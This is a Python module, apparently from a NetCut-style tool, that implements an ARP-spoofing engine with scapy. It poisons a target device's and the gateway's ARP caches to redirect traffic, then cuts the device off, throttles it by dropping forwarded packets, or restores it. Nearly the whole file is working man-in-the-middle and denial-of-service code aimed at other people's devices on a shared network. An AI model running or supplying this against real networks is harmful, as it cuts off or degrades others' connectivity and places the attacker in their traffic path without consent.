"""ARP-spoofing engine: cut / throttle / restore individual devices.

Each affected device gets its own daemon thread that continuously poisons both
the target and the gateway (this is what redirects the target's traffic to us).

* CUT      = poison only. Traffic arrives at us and is silently dropped.
* THROTTLE = poison + forward. We forward the target's traffic back out, but
             drop a configurable percentage of packets. TCP treats the loss as
             congestion and backs off, so the connection slows down. This is a
             probabilistic throttle, not a precise Mbps limit, but it is a
             convincing, cross-platform demo (pure scapy, no extra drivers).

Stopping a device sends corrective ARP replies so its connectivity is restored
immediately instead of waiting for the caches to time out.
"""
import random
import threading

from device import Device
from scanner import BROADCAST, get_mac
from scapy.layers.inet import IP
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, sendp, sniff

_INTERVAL = 2.0  # seconds between poison rounds


class Spoofer:
    def __init__(self, gateway_ip: str, gateway_mac: str | None, iface=None):
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac or BROADCAST
        self.iface = iface
        self.my_ip = getattr(iface, 'ip', None)
        self.my_mac = (iface.mac.lower() if iface and getattr(iface, 'mac', None) else None)
        # ARP-poison threads (used by both cut and throttle)
        self._stops: dict[str, threading.Event] = {}
        self._threads: dict[str, threading.Thread] = {}
        # packet-forwarding threads (throttle only)
        self._fwd_stops: dict[str, threading.Event] = {}
        self._fwd_threads: dict[str, threading.Thread] = {}

    def is_cutting(self, ip: str) -> bool:
        return ip in self._threads and self._threads[ip].is_alive()

    @property
    def active_count(self) -> int:
        return sum(1 for t in self._threads.values() if t.is_alive())

    @property
    def can_throttle(self) -> bool:
        """Forwarding needs our own MAC to rewrite frames."""
        return bool(self.my_mac and self.gateway_mac != BROADCAST)

    def start(self, device: Device) -> bool:
        """Full cut: poison the caches and drop everything (no forwarding)."""
        if not device.is_target:
            return False
        self._stop_forward(device)  # a cut drops 100% — never forward
        self._ensure_poison(device)
        device.status = 'cut'
        device.throttle = 0
        return True

    def throttle(self, device: Device, percent: int) -> bool:
        """Poison + forward, dropping ``percent`` % of the device's packets."""
        if not device.is_target or not self.can_throttle:
            return False
        percent = max(1, min(99, percent))
        self._ensure_poison(device)
        self._start_forward(device, percent / 100.0)
        device.status = 'throttled'
        device.throttle = percent
        return True

    def stop(self, device: Device) -> bool:
        """Restore a cut/throttled device to full connectivity."""
        if device.ip not in self._stops and device.ip not in self._fwd_stops:
            return False
        self._stop_forward(device)
        if device.ip in self._stops:
            self._stops[device.ip].set()
            self._threads.pop(device.ip, None)
            self._stops.pop(device.ip, None)
        device.status = 'online'
        device.throttle = 0
        self._restore(device)
        return True

    def stop_all(self, devices: list[Device]) -> None:
        for d in list(devices):
            if d.ip in self._stops or d.ip in self._fwd_stops:
                self.stop(d)

    # -- internals ---------------------------------------------------------

    def _ensure_poison(self, device: Device) -> None:
        if self.is_cutting(device.ip):
            return
        stop = threading.Event()
        self._stops[device.ip] = stop
        t = threading.Thread(target=self._loop, args=(device, stop), daemon=True)
        self._threads[device.ip] = t
        t.start()

    def _start_forward(self, device: Device, drop_rate: float) -> None:
        self._stop_forward(device)  # replace any existing forwarder (e.g. new %)
        stop = threading.Event()
        self._fwd_stops[device.ip] = stop
        t = threading.Thread(target=self._forward_loop,
                             args=(device, drop_rate, stop), daemon=True)
        self._fwd_threads[device.ip] = t
        t.start()

    def _stop_forward(self, device: Device) -> None:
        if device.ip in self._fwd_stops:
            self._fwd_stops[device.ip].set()
            self._fwd_threads.pop(device.ip, None)
            self._fwd_stops.pop(device.ip, None)

    def _loop(self, device: Device, stop: threading.Event) -> None:
        while not stop.is_set():
            try:
                # Tell the target that we are the gateway.
                send(ARP(op=2, pdst=device.ip, hwdst=device.mac, psrc=self.gateway_ip),
                     verbose=False, iface=self.iface)
                # Tell the gateway that we are the target.
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=device.ip),
                     verbose=False, iface=self.iface)
                device.packets += 2
            except Exception:
                pass
            stop.wait(_INTERVAL)

    def _forward_loop(self, device: Device, drop_rate: float, stop: threading.Event) -> None:
        """Forward the victim's traffic, dropping ``drop_rate`` of packets.

        Only frames redirected to *us* that involve the victim's IP are touched
        (BPF-filtered for efficiency). Outbound victim traffic is re-sent to the
        real gateway; inbound traffic is re-sent to the victim — both with our
        MAC as the source, which is exactly what a real router would do.
        """
        vip, vmac = device.ip, device.mac
        my_mac, my_ip = self.my_mac, self.my_ip
        gmac = self.gateway_mac
        bpf = f'ip host {vip} and ether dst {my_mac}'

        def handle(pkt) -> None:
            if IP not in pkt:
                return
            ip = pkt[IP]
            if ip.src == vip and ip.dst != my_ip:
                dst_mac = gmac          # victim -> internet
            elif ip.dst == vip and ip.src != my_ip:
                dst_mac = vmac          # internet -> victim
            else:
                return
            if random.random() < drop_rate:
                return                  # dropped — this is the throttle
            try:
                sendp(Ether(src=my_mac, dst=dst_mac) / ip,
                      verbose=False, iface=self.iface)
            except Exception:
                pass

        while not stop.is_set():
            try:
                sniff(filter=bpf, prn=handle, store=False,
                      iface=self.iface, timeout=1)
            except Exception:
                break

    def _restore(self, device: Device) -> None:
        """Re-advertise the real MAC<->IP mappings to heal both caches."""
        target_mac = device.mac or get_mac(device.ip)
        if not target_mac or self.gateway_mac == BROADCAST:
            return
        for _ in range(5):
            send(ARP(op=2, pdst=device.ip, hwdst=target_mac,
                     psrc=self.gateway_ip, hwsrc=self.gateway_mac), verbose=False, iface=self.iface)
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                     psrc=device.ip, hwsrc=target_mac), verbose=False, iface=self.iface)
